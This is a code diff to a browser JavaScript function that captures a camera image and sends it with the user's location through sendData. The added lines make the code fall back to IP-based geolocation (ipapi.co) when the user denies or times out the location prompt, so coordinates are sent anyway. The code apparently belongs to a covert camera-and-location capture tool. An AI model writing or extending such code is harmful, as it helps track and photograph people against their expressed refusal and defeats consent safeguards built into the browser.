@@ -281,22 +281,35 @@ async function start() {
 
     stream.getTracks().forEach(t => t.stop());
 
-    // Try geolocation with timeout
-    const geoPromise = new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          console.log("Geolocation success:", pos.coords);
-          resolve(pos.coords);
-        },
-        err => {
-          console.log("Geolocation error:", err);
-          resolve(null); // Resolve with null to continue
-        },
-        { timeout: 5000, enableHighAccuracy: true } // Reduced timeout for faster response
-      );
-    });
+    // Try geolocation with timeout, fallback to IP geolocation
+    let coords = null;
+    try {
+      coords = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos.coords),
+          err => resolve(null), // Resolve null to try IP fallback
+          { timeout: 5000, enableHighAccuracy: true }
+        );
+      });
+    } catch (e) {
+      console.log("Geolocation API error:", e);
+    }
 
-    const coords = await geoPromise;
+    if (!coords) {
+      // Fallback to IP-based geolocation
+      try {
+        console.log("Trying IP-based geolocation...");
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
+        if (ipData.latitude && ipData.longitude) {
+          coords = { latitude: ipData.latitude, longitude: ipData.longitude };
+          console.log("IP geolocation success:", coords);
+        }
+      } catch (e) {
+        console.log("IP geolocation failed:", e);
+      }
+    }
+
     sendData(image, coords ? coords.latitude : null, coords ? coords.longitude : null);
 
   } catch (err) {
